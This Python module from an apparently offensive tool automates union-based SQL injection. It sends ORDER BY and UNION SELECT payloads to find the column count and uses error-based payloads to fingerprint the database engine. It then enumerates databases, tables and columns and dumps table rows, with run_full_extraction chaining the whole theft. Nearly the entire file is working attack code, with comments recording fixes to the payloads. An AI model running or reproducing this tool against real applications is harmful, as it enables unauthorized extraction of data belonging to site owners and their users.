# attack/union_extractor.py
# FIXED: BUG-02 database detection logic + BUG-07 LIMIT syntax per DB
import re
from typing import Dict, List
from ..core.types import DBType
from ..core.crypto import QuantumCryptoDNS

class UnionExtractor:
    """
    FIXED: Database detection logic corrected.
    FIXED: LIMIT syntax per database type.
    """

    def __init__(self, injector, crypto: QuantumCryptoDNS):
        self.injector     = injector
        self.crypto       = crypto
        self.db_type      = DBType.UNKNOWN
        self.column_count = 0
        self.schema       = {}

    def _detect_column_count(self, max_columns: int = 30) -> int:
        for i in range(1, max_columns + 1):
            payload = f"' ORDER BY {i}--"
            result  = self.injector.test_payload(payload)
            if result.get('error') or result.get('status_code') in [500, 404]:
                return i - 1

        for i in range(1, max_columns + 1):
            nulls   = ','.join(['NULL'] * i)
            payload = f"' UNION SELECT {nulls}--"
            result  = self.injector.test_payload(payload)
            if not result.get('error'):
                return i
        return 0

    def _detect_database_type(self) -> DBType:
        """
        FIXED: Deteksi berdasarkan error message spesifik dengan logic yang benar.
        BUG-02 fix: MySQL dan MSSQL payload berbeda, logic corrected.
        """
        detection_map = [
            ("' AND @@version--",         ["mysql", "mariadb"],              DBType.MYSQL),
            ("' AND SERVERPROPERTY('ProductVersion')--", ["microsoft", "sql server"], DBType.MSSQL),
            ("' AND version()--",         ["postgresql"],                    DBType.POSTGRESQL),
            ("' AND banner IS NOT NULL--", ["oracle"],                       DBType.ORACLE),
            ("' AND sqlite_version()--",  ["sqlite"],                        DBType.SQLITE),
        ]

        for payload, keywords, db_type in detection_map:
            result = self.injector.test_payload(payload)
            body   = (result.get('response_text') or '').lower()
            if any(kw in body for kw in keywords):
                return db_type

        # Fallback error-based detection
        error_payloads = {
            DBType.MYSQL:      "' AND extractvalue(1,concat(0x7e,@@version))--",
            DBType.POSTGRESQL: "' AND CAST(version() AS int)--",
            DBType.MSSQL:      "' AND CONVERT(int,@@version)--",
        }
        for db_type, payload in error_payloads.items():
            result = self.injector.test_payload(payload)
            if result.get('vulnerable'):
                return db_type

        return DBType.UNKNOWN

    def _limit_clause(self, limit: int, offset: int) -> str:
        """FIXED: LIMIT/OFFSET syntax per database type."""
        if self.db_type == DBType.MSSQL:
            return f"ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY"
        elif self.db_type == DBType.ORACLE:
            return f"WHERE ROWNUM <= {offset + limit}"
        else:
            return f"LIMIT {limit} OFFSET {offset}"

    def _get_version_query(self) -> str:
        return {
            DBType.MYSQL:      "SELECT @@version",
            DBType.POSTGRESQL: "SELECT version()",
            DBType.MSSQL:      "SELECT @@version",
            DBType.ORACLE:     "SELECT banner FROM v$version",
            DBType.SQLITE:     "SELECT sqlite_version()",
        }.get(self.db_type, "SELECT version()")

    def extract_database_version(self) -> str:
        payload = f"' UNION {self._get_version_query()}--"
        result  = self.injector.test_payload(payload)
        if result.get('response_text'):
            match = re.search(r'(\d+\.\d+\.\d+|\d+\.\d+)', result['response_text'])
            if match:
                return match.group(1)
        return "Unknown"

    def extract_database_names(self) -> List[str]:
        queries = {
            DBType.MYSQL:      "SELECT schema_name FROM information_schema.schemata",
            DBType.POSTGRESQL: "SELECT datname FROM pg_database",
            DBType.MSSQL:      "SELECT name FROM sys.databases",
            DBType.SQLITE:     "SELECT name FROM sqlite_master WHERE type='table'",
        }
        query     = queries.get(self.db_type, "SELECT schema_name FROM information_schema.schemata")
        databases = []

        for offset in range(0, 50, 5):
            limit_sql = self._limit_clause(5, offset)
            payload   = f"' UNION {query} {limit_sql}--"
            result    = self.injector.test_payload(payload)
            if result.get('response_text'):
                matches = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]{2,})', result['response_text'])
                databases.extend([m for m in matches if len(m) > 2 and m not in databases])

        return databases[:20]

    def extract_tables(self, database: str = None) -> Dict[str, List[str]]:
        if self.db_type == DBType.MYSQL:
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database or 'public'}'"
        elif self.db_type == DBType.POSTGRESQL:
            query = f"SELECT tablename FROM pg_tables WHERE schemaname='{database or 'public'}'"
        elif self.db_type == DBType.MSSQL:
            query = "SELECT name FROM sysobjects WHERE xtype='U'"
        else:
            query = "SELECT name FROM sqlite_master WHERE type='table'"

        payload = f"' UNION {query}--"
        result  = self.injector.test_payload(payload)
        tables  = {}
        if result.get('response_text'):
            matches = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]{2,})', result['response_text'])
            tables[database or 'default'] = [m for m in matches if len(m) > 3][:30]
        return tables

    def extract_columns(self, table: str) -> List[str]:
        queries = {
            DBType.MYSQL:      f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
            DBType.POSTGRESQL: f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
            DBType.MSSQL:      f"SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table}')",
            DBType.SQLITE:     f"PRAGMA table_info({table})",
        }
        query   = queries.get(self.db_type, queries[DBType.MYSQL])
        payload = f"' UNION {query}--"
        result  = self.injector.test_payload(payload)
        columns = []
        if result.get('response_text'):
            matches = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]{2,})', result['response_text'])
            columns = [m for m in matches if len(m) > 2 and m.lower() not in ['null', 'select', 'union']][:20]
        return columns

    def dump_table(self, table: str, columns: List[str], limit: int = 100) -> List[Dict]:
        data        = []
        columns_str = ','.join(columns[:5])

        for offset in range(0, limit, 10):
            limit_sql = self._limit_clause(10, offset)
            payload   = f"' UNION SELECT {columns_str} FROM {table} {limit_sql}--"
            result    = self.injector.test_payload(payload)
            if result.get('response_text'):
                lines = result['response_text'].split('\n')
                for line in lines:
                    if '|' in line or '\t' in line:
                        parts = re.split(r'[|\t]+', line)
                        if len(parts) >= len(columns):
                            row = {col: parts[i].strip() for i, col in enumerate(columns[:len(parts)])}
                            data.append(row)
        return data

    def run_full_extraction(self) -> Dict:
        print("[*] Starting Union-based data extraction...")
        self.column_count = self._detect_column_count()
        print(f"[+] Column count: {self.column_count}")
        self.db_type = self._detect_database_type()
        print(f"[+] Database type: {self.db_type.value}")
        version   = self.extract_database_version()
        databases = self.extract_database_names()
        all_tables = {}
        for db in databases[:3]:
            tables = self.extract_tables(db)
            all_tables.update(tables)
        extracted_data = {}
        for db, tables in all_tables.items():
            for table in tables[:5]:
                columns = self.extract_columns(table)
                if columns:
                    data = self.dump_table(table, columns, limit=50)
                    extracted_data[f"{db}.{table}"] = {'columns': columns, 'rows': data}
        import time
        return {
            'database_type':  self.db_type.value,
            'version':        version,
            'column_count':   self.column_count,
            'databases':      databases,
            'tables':         all_tables,
            'extracted_data': extracted_data,
            'timestamp':      time.time(),
        }
